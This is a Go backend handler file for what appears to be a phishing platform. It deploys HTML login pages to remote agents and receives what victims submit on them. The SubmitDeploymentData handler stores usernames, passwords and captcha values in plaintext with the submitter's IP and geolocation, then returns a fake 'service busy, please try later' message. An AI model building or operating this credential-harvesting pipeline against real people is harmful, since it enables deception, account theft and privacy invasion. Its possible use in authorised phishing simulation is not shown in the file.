package handlers

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"fishing-platform-backend/config"
	"fishing-platform-backend/middleware"
	"fishing-platform-backend/models"
	"fishing-platform-backend/utils"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

const agentTaskLeaseDuration = 60 * time.Second

const (
	agentProjectPortStart uint = 10000
	agentProjectPortEnd   uint = 20000
)

type deploymentResponse struct {
	ID               uint                    `json:"id"`
	ProjectID        uint                    `json:"project_id"`
	AgentID          uint                    `json:"agent_id"`
	Agent            agentResponse           `json:"agent"`
	DesiredStatus    models.DeploymentStatus `json:"desired_status"`
	ActualStatus     models.DeploymentStatus `json:"actual_status"`
	DesiredRevision  int64                   `json:"desired_revision"`
	DeployedRevision int64                   `json:"deployed_revision"`
	RuntimePort      uint                    `json:"runtime_port"`
	RuntimeURL       string                  `json:"runtime_url"`
	LastError        string                  `json:"last_error"`
	LastSeenAt       *time.Time              `json:"last_seen_at"`
	LastSyncedAt     *time.Time              `json:"last_synced_at"`
}

type taskResultRequest struct {
	Success       bool   `json:"success"`
	RuntimePort   uint   `json:"runtime_port"`
	RuntimeURL    string `json:"runtime_url"`
	ContainerID   string `json:"container_id"`
	ContainerName string `json:"container_name"`
	Revision      int64  `json:"revision"`
	Error         string `json:"error"`
	Result        any    `json:"result"`
}

type logEntryRequest struct {
	Sequence int64     `json:"sequence"`
	TaskID   string    `json:"task_id"`
	Stream   string    `json:"stream"`
	Level    string    `json:"level"`
	Message  string    `json:"message"`
	LoggedAt time.Time `json:"logged_at"`
}

func toDeploymentResponse(deployment models.ProjectDeployment) deploymentResponse {
	return deploymentResponse{
		ID:               deployment.ID,
		ProjectID:        deployment.ProjectID,
		AgentID:          deployment.AgentID,
		Agent:            toAgentResponse(deployment.Agent),
		DesiredStatus:    deployment.DesiredStatus,
		ActualStatus:     deployment.ActualStatus,
		DesiredRevision:  deployment.DesiredRevision,
		DeployedRevision: deployment.DeployedRevision,
		RuntimePort:      deployment.RuntimePort,
		RuntimeURL:       deployment.RuntimeURL,
		LastError:        deployment.LastError,
		LastSeenAt:       deployment.LastSeenAt,
		LastSyncedAt:     deployment.LastSyncedAt,
	}
}

func enqueueAgentTask(tx *gorm.DB, deployment models.ProjectDeployment, taskType string) error {
	taskID, err := generateURLToken("task_", 16)
	if err != nil {
		return err
	}
	var project models.Project
	if err := tx.First(&project, deployment.ProjectID).Error; err != nil {
		return err
	}
	if taskType == "project.deploy" && deployment.RuntimePort == 0 {
		port, err := allocateAgentProjectPort(tx, deployment.AgentID)
		if err != nil {
			return err
		}
		deployment.RuntimePort = port
		if err := tx.Model(&models.ProjectDeployment{}).Where("id = ?", deployment.ID).
			Update("runtime_port", port).Error; err != nil {
			return err
		}
	}
	payload, err := json.Marshal(gin.H{
		"project_id":        deployment.ProjectID,
		"deployment_id":     deployment.ID,
		"revision":          deployment.DesiredRevision,
		"desired_status":    deployment.DesiredStatus,
		"project_name":      project.Name,
		"frontend_route":    project.FrontendRoute,
		"container_route":   project.ContainerRoute,
		"runtime_port":      deployment.RuntimePort,
		"artifact_endpoint": fmt.Sprintf("/api/agent/deployments/%d/artifact/", deployment.ID),
	})
	if err != nil {
		return err
	}
	return tx.Create(&models.AgentTask{
		TaskID:       taskID,
		AgentID:      deployment.AgentID,
		ProjectID:    deployment.ProjectID,
		DeploymentID: deployment.ID,
		Type:         taskType,
		Payload:      string(payload),
		Status:       models.AgentTaskStatusPending,
	}).Error
}

func allocateAgentProjectPort(tx *gorm.DB, agentID uint) (uint, error) {
	var used []uint
	if err := tx.Model(&models.ProjectDeployment{}).
		Where("agent_id = ? AND desired_status <> ? AND runtime_port BETWEEN ? AND ?", agentID, models.DeploymentStatusRemoved, agentProjectPortStart, agentProjectPortEnd).
		Pluck("runtime_port", &used).Error; err != nil {
		return 0, err
	}
	taken := make(map[uint]struct{}, len(used))
	for _, port := range used {
		taken[port] = struct{}{}
	}
	for port := agentProjectPortStart; port <= agentProjectPortEnd; port++ {
		if _, exists := taken[port]; !exists {
			return port, nil
		}
	}
	return 0, fmt.Errorf("no project port available for agent %d in range %d-%d", agentID, agentProjectPortStart, agentProjectPortEnd)
}

// syncProjectDeployments reconciles the selected agents and queues idempotent tasks.
func syncProjectDeployments(tx *gorm.DB, project *models.Project, agentIDs []uint) error {
	selected := make(map[uint]struct{}, len(agentIDs))
	for _, id := range agentIDs {
		if id == 0 {
			continue
		}
		selected[id] = struct{}{}
	}
	if len(selected) > 0 {
		var count int64
		ids := make([]uint, 0, len(selected))
		for id := range selected {
			ids = append(ids, id)
		}
		if err := tx.Model(&models.Agent{}).Where("id IN ?", ids).Count(&count).Error; err != nil {
			return err
		}
		if count != int64(len(ids)) {
			return errors.New("one or more selected agents do not exist")
		}
	}

	var existing []models.ProjectDeployment
	if err := tx.Where("project_id = ?", project.ID).Find(&existing).Error; err != nil {
		return err
	}
	byAgent := make(map[uint]models.ProjectDeployment, len(existing))
	for _, deployment := range existing {
		byAgent[deployment.AgentID] = deployment
	}

	for agentID := range selected {
		deployment, exists := byAgent[agentID]
		if !exists {
			deployment = models.ProjectDeployment{
				ProjectID:       project.ID,
				AgentID:         agentID,
				DesiredStatus:   models.DeploymentStatusRunning,
				ActualStatus:    models.DeploymentStatusPending,
				DesiredRevision: project.DeploymentRevision,
			}
			if err := tx.Create(&deployment).Error; err != nil {
				return err
			}
		} else {
			if deployment.DesiredStatus == models.DeploymentStatusRemoved {
				deployment.RuntimePort = 0
				deployment.RuntimeURL = ""
			}
			deployment.DesiredStatus = models.DeploymentStatusRunning
			deployment.DesiredRevision = project.DeploymentRevision
			deployment.ActualStatus = models.DeploymentStatusPending
			deployment.LastError = ""
			if err := tx.Save(&deployment).Error; err != nil {
				return err
			}
		}
		if err := enqueueAgentTask(tx, deployment, "project.deploy"); err != nil {
			return err
		}
	}

	for _, deployment := range existing {
		if _, keep := selected[deployment.AgentID]; keep || deployment.DesiredStatus == models.DeploymentStatusRemoved {
			continue
		}
		deployment.DesiredStatus = models.DeploymentStatusRemoved
		if err := tx.Save(&deployment).Error; err != nil {
			return err
		}
		if err := enqueueAgentTask(tx, deployment, "project.delete"); err != nil {
			return err
		}
	}
	return nil
}

func loadProjectDeployments(db *gorm.DB, projectID uint) []deploymentResponse {
	var deployments []models.ProjectDeployment
	if err := db.Preload("Agent").Where("project_id = ? AND desired_status <> ?", projectID, models.DeploymentStatusRemoved).
		Order("id ASC").Find(&deployments).Error; err != nil {
		return []deploymentResponse{}
	}
	result := make([]deploymentResponse, 0, len(deployments))
	for _, deployment := range deployments {
		result = append(result, toDeploymentResponse(deployment))
	}
	return result
}

// LeaseAgentTasks gives an agent exclusive, expiring ownership of pending work.
func LeaseAgentTasks(c *gin.Context) {
	agent, ok := authenticateAgent(c)
	if !ok {
		return
	}
	limit, _ := strconv.Atoi(c.DefaultQuery("limit", "5"))
	if limit < 1 {
		limit = 1
	}
	if limit > 20 {
		limit = 20
	}

	db := config.GetDB()
	now := time.Now()
	db.Model(&models.AgentTask{}).
		Where("agent_id = ? AND status IN ? AND lease_expires_at < ?", agent.ID,
			[]models.AgentTaskStatus{models.AgentTaskStatusLeased, models.AgentTaskStatusRunning}, now).
		Updates(map[string]any{"status": models.AgentTaskStatusPending, "lease_expires_at": nil})

	var tasks []models.AgentTask
	err := db.Transaction(func(tx *gorm.DB) error {
		if err := tx.Where("agent_id = ? AND status = ?", agent.ID, models.AgentTaskStatusPending).
			Order("id ASC").Limit(limit).Find(&tasks).Error; err != nil {
			return err
		}
		leaseUntil := now.Add(agentTaskLeaseDuration)
		claimed := make([]models.AgentTask, 0, len(tasks))
		for i := range tasks {
			result := tx.Model(&models.AgentTask{}).
				Where("id = ? AND status = ?", tasks[i].ID, models.AgentTaskStatusPending).
				Updates(map[string]any{"status": models.AgentTaskStatusLeased, "lease_expires_at": leaseUntil, "attempt": gorm.Expr("attempt + 1")})
			if result.Error != nil {
				return result.Error
			}
			if result.RowsAffected == 0 {
				continue
			}
			tasks[i].Status = models.AgentTaskStatusLeased
			tasks[i].LeaseExpiresAt = &leaseUntil
			tasks[i].Attempt++
			claimed = append(claimed, tasks[i])
		}
		tasks = claimed
		return nil
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to lease tasks"})
		return
	}

	response := make([]gin.H, 0, len(tasks))
	for _, task := range tasks {
		var payload any
		_ = json.Unmarshal([]byte(task.Payload), &payload)
		response = append(response, gin.H{
			"task_id": task.TaskID, "type": task.Type, "project_id": task.ProjectID,
			"deployment_id": task.DeploymentID, "payload": payload,
			"lease_expires_at": task.LeaseExpiresAt,
		})
	}
	c.JSON(http.StatusOK, gin.H{"tasks": response})
}

func StartAgentTask(c *gin.Context) {
	agent, ok := authenticateAgent(c)
	if !ok {
		return
	}
	now := time.Now()
	result := config.GetDB().Model(&models.AgentTask{}).
		Where("task_id = ? AND agent_id = ? AND status = ?", c.Param("taskID"), agent.ID, models.AgentTaskStatusLeased).
		Updates(map[string]any{"status": models.AgentTaskStatusRunning, "started_at": now, "lease_expires_at": now.Add(agentTaskLeaseDuration)})
	if result.Error != nil || result.RowsAffected == 0 {
		c.JSON(http.StatusConflict, gin.H{"error": "Task is not leased by this agent"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": "running"})
}

func RenewAgentTask(c *gin.Context) {
	agent, ok := authenticateAgent(c)
	if !ok {
		return
	}
	leaseUntil := time.Now().Add(agentTaskLeaseDuration)
	result := config.GetDB().Model(&models.AgentTask{}).
		Where("task_id = ? AND agent_id = ? AND status = ?", c.Param("taskID"), agent.ID, models.AgentTaskStatusRunning).
		Update("lease_expires_at", leaseUntil)
	if result.Error != nil || result.RowsAffected == 0 {
		c.JSON(http.StatusConflict, gin.H{"error": "Task is not running on this agent"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"lease_expires_at": leaseUntil})
}

func CompleteAgentTask(c *gin.Context) {
	agent, ok := authenticateAgent(c)
	if !ok {
		return
	}
	var req taskResultRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid result"})
		return
	}
	db := config.GetDB()
	var task models.AgentTask
	if err := db.Where("task_id = ? AND agent_id = ?", c.Param("taskID"), agent.ID).First(&task).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
		return
	}
	now := time.Now()
	err := db.Transaction(func(tx *gorm.DB) error {
		resultJSON, _ := json.Marshal(req.Result)
		status := models.AgentTaskStatusSucceeded
		if !req.Success {
			status = models.AgentTaskStatusFailed
		}
		if err := tx.Model(&task).Updates(map[string]any{
			"status": status, "finished_at": now, "lease_expires_at": nil,
			"error_message": req.Error, "result": string(resultJSON),
		}).Error; err != nil {
			return err
		}
		updates := map[string]any{"last_seen_at": now, "last_synced_at": now, "last_error": req.Error}
		if req.Success {
			actual := models.DeploymentStatusRunning
			if task.Type == "project.stop" {
				actual = models.DeploymentStatusStopped
			} else if task.Type == "project.delete" {
				actual = models.DeploymentStatusRemoved
			}
			updates["actual_status"] = actual
			updates["deployed_revision"] = req.Revision
			updates["runtime_port"] = req.RuntimePort
			updates["runtime_url"] = strings.TrimSpace(req.RuntimeURL)
			updates["container_id"] = strings.TrimSpace(req.ContainerID)
			updates["container_name"] = strings.TrimSpace(req.ContainerName)
		} else {
			updates["actual_status"] = models.DeploymentStatusFailed
		}
		if err := tx.Model(&models.ProjectDeployment{}).
			Where("id = ? AND agent_id = ?", task.DeploymentID, agent.ID).Updates(updates).Error; err != nil {
			return err
		}
		if req.Success && task.Type == "project.delete" {
			var remaining int64
			if err := tx.Model(&models.ProjectDeployment{}).
				Where("project_id = ? AND actual_status <> ?", task.ProjectID, models.DeploymentStatusRemoved).
				Count(&remaining).Error; err != nil {
				return err
			}
			if remaining == 0 {
				var project models.Project
				if err := tx.First(&project, task.ProjectID).Error; err == nil && project.DeletionPending {
					if err := tx.Where("project_id = ?", project.ID).Delete(&models.ProjectLog{}).Error; err != nil {
						return err
					}
					if err := tx.Where("project_id = ?", project.ID).Delete(&models.AgentTask{}).Error; err != nil {
						return err
					}
					if err := tx.Where("project_id = ?", project.ID).Delete(&models.ProjectDeployment{}).Error; err != nil {
						return err
					}
					if err := tx.Delete(&project).Error; err != nil {
						return err
					}
				}
			}
		}
		return nil
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to store task result"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": "completed"})
}

func DownloadDeploymentArtifact(c *gin.Context) {
	agent, ok := authenticateAgent(c)
	if !ok {
		return
	}
	var deployment models.ProjectDeployment
	if err := config.GetDB().Preload("Project").Where("id = ? AND agent_id = ?", c.Param("id"), agent.ID).
		First(&deployment).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Deployment not found"})
		return
	}
	if deployment.Project.HtmlFilePath == "" {
		c.JSON(http.StatusNotFound, gin.H{"error": "Project HTML artifact not found"})
		return
	}
	if _, err := os.Stat(deployment.Project.HtmlFilePath); err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Project HTML artifact not found"})
		return
	}
	artifact, err := utils.RenderProjectHTMLFile(deployment.Project.HtmlFilePath, utils.ProjectHTMLVars{
		SubmitURL:   deployment.Project.ContainerRoute,
		RedirectURL: deployment.Project.LoginURL,
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read project artifact"})
		return
	}
	sum := sha256.Sum256(artifact)
	c.Header("X-Artifact-SHA256", hex.EncodeToString(sum[:]))
	c.Header("X-Project-ID", strconv.FormatUint(uint64(deployment.ProjectID), 10))
	c.Header("X-Deployment-Revision", strconv.FormatInt(deployment.DesiredRevision, 10))
	c.Header("Content-Disposition", `attachment; filename="index.html"`)
	c.Data(http.StatusOK, "text/html; charset=utf-8", artifact)
}

// SubmitDeploymentData stores a submission for the project assigned to the
// authenticated agent. Project identity is derived from the deployment.
func SubmitDeploymentData(c *gin.Context) {
	agent, ok := authenticateAgent(c)
	if !ok {
		return
	}
	var deployment models.ProjectDeployment
	if err := config.GetDB().Where("id = ? AND agent_id = ?", c.Param("id"), agent.ID).First(&deployment).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Deployment not found"})
		return
	}
	var payload credentialPayload
	if err := c.ShouldBind(&payload); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request data"})
		return
	}
	sourceIP := normalizeSubmittedIP(payload.IPAddress)
	if sourceIP == "" {
		sourceIP = normalizeSubmittedIP(c.GetHeader("X-Forwarded-For"))
	}
	if sourceIP == "" {
		sourceIP = c.ClientIP()
	}
	db := config.GetDB()
	if isIPBlacklisted(db, sourceIP) {
		c.JSON(http.StatusForbidden, gin.H{"error": "IP is blacklisted"})
		return
	}
	credential := models.Credential{
		ProjectID: deployment.ProjectID, Username: payload.Username, Password: payload.Password,
		CaptchaValue: payload.CaptchaValue, IPAddress: sourceIP, IPLocation: utils.LookupIPLocation(sourceIP),
	}
	if err := db.Create(&credential).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to store submission"})
		return
	}
	c.JSON(http.StatusOK, gin.H{"message": "服务繁忙 请稍后再试!"})
}

func UploadDeploymentLogs(c *gin.Context) {
	agent, ok := authenticateAgent(c)
	if !ok {
		return
	}
	var deployment models.ProjectDeployment
	if err := config.GetDB().Where("id = ? AND agent_id = ?", c.Param("id"), agent.ID).First(&deployment).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Deployment not found"})
		return
	}
	var req struct {
		Entries []logEntryRequest `json:"entries"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || len(req.Entries) > 1000 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid log batch"})
		return
	}
	accepted := 0
	var ack int64
	for _, entry := range req.Entries {
		if strings.TrimSpace(entry.Message) == "" || entry.Sequence <= 0 {
			continue
		}
		if entry.LoggedAt.IsZero() {
			entry.LoggedAt = time.Now()
		}
		logRecord := models.ProjectLog{
			ProjectID: deployment.ProjectID, AgentID: agent.ID, DeploymentID: deployment.ID,
			TaskID: entry.TaskID, Stream: entry.Stream, Level: entry.Level,
			Sequence: entry.Sequence, Message: entry.Message, LoggedAt: entry.LoggedAt,
		}
		err := config.GetDB().Create(&logRecord).Error
		if err == nil {
			accepted++
		} else if !strings.Contains(strings.ToLower(err.Error()), "unique") {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to store logs"})
			return
		}
		if entry.Sequence > ack {
			ack = entry.Sequence
		}
	}
	c.JSON(http.StatusOK, gin.H{"accepted": accepted, "acked_sequence": ack})
}

func GetProjectDeployments(c *gin.Context) {
	projectID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid project ID"})
		return
	}
	user, ok := currentUserOrAbort(c)
	if !ok {
		return
	}
	db := config.GetDB()
	var project models.Project
	if err := scopeByOwner(db, user).First(&project, uint(projectID)).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Project not found"})
		return
	}
	c.JSON(http.StatusOK, loadProjectDeployments(db, project.ID))
}

func ControlProjectDeployment(c *gin.Context) {
	projectID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid project ID"})
		return
	}
	deploymentID, err := strconv.ParseUint(c.Param("deploymentID"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid deployment ID"})
		return
	}
	action := strings.TrimSpace(c.Param("action"))
	if action == "delete" {
		user, ok := middleware.CurrentUser(c)
		if !ok || !user.Role.IsAdmin() {
			c.JSON(http.StatusForbidden, gin.H{"error": "Admin privileges required"})
			return
		}
	}
	user, ok := currentUserOrAbort(c)
	if !ok {
		return
	}
	db := config.GetDB()
	var project models.Project
	if err := scopeByOwner(db, user).First(&project, uint(projectID)).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Project not found"})
		return
	}
	var deployment models.ProjectDeployment
	if err := db.Where("id = ? AND project_id = ?", uint(deploymentID), project.ID).First(&deployment).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Deployment not found"})
		return
	}
	taskType := ""
	switch action {
	case "deploy", "redeploy", "start", "restart":
		deployment.DesiredStatus = models.DeploymentStatusRunning
		deployment.ActualStatus = models.DeploymentStatusPending
		deployment.DesiredRevision = project.DeploymentRevision
		taskType = "project.deploy"
	case "stop":
		deployment.DesiredStatus = models.DeploymentStatusStopped
		taskType = "project.stop"
	case "delete":
		deployment.DesiredStatus = models.DeploymentStatusRemoved
		taskType = "project.delete"
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "Unsupported deployment action"})
		return
	}
	if err := db.Transaction(func(tx *gorm.DB) error {
		if err := tx.Save(&deployment).Error; err != nil {
			return err
		}
		return enqueueAgentTask(tx, deployment, taskType)
	}); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue deployment action"})
		return
	}
	c.JSON(http.StatusAccepted, gin.H{"status": "queued", "action": action})
}

func GetProjectLogs(c *gin.Context) {
	projectID, err := strconv.ParseUint(c.Param("id"), 10, 32)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid project ID"})
		return
	}
	user, ok := currentUserOrAbort(c)
	if !ok {
		return
	}
	db := config.GetDB()
	var project models.Project
	if err := scopeByOwner(db, user).First(&project, uint(projectID)).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Project not found"})
		return
	}
	limit, _ := strconv.Atoi(c.DefaultQuery("limit", "500"))
	if limit < 1 || limit > 2000 {
		limit = 500
	}
	query := db.Where("project_id = ?", project.ID)
	if agentID := strings.TrimSpace(c.Query("agent_id")); agentID != "" {
		query = query.Where("agent_id = ?", agentID)
	}
	var logs []models.ProjectLog
	if err := query.Order("logged_at DESC, id DESC").Limit(limit).Find(&logs).Error; err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to retrieve project logs"})
		return
	}
	c.JSON(http.StatusOK, logs)
}
